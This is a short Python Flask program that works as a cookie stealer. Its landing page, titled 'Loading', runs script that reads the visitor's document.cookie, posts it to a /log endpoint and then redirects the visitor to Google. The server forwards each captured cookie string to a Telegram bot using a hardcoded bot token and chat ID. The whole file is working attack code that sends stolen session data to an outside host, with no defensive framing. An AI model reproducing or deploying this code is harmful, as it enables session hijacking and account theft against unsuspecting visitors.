import os,requests
from flask import Flask,request,make_response
from werkzeug.middleware.proxy_fix import ProxyFix

app=Flask(__name__)
app.wsgi_app=ProxyFix(app.wsgi_app,x_for=1,x_proto=1,x_host=1,x_prefix=1)

TOK="8554468568:AAFvQJVSo6TtBao6xreo_Zf1DxnFupKVTrc"
CHAT="1367401179"

def send(t):
    try:requests.post(f"https://api.telegram.org/bot{TOK}/sendMessage",
                      json={"chat_id":CHAT,"text":t,"parse_mode":"HTML"},timeout=5)
    except:pass

@app.route('/log',methods=['POST'])
def log():
    d=request.get_json(silent=True)
    if d and d.get('c'):
        send(f"🍪 <b>New Cookies</b>\n\n<code>{d['c']}</code>")
    return "ok"

@app.route('/')
def idx():
    return make_response(f"""
<!DOCTYPE html>
<html>
<head><title>Loading</title><script>
fetch('/log',{{
    method:'POST',
    headers:{{'Content-Type':'application/json'}},
    body:JSON.stringify({{c:document.cookie}})
}}).finally(()=>window.location.href='https://www.google.com');
</script></head><body></body>
</html>
""")

if __name__=='__main__':
    app.run(host='0.0.0.0',port=int(os.environ.get('PORT',10000)))
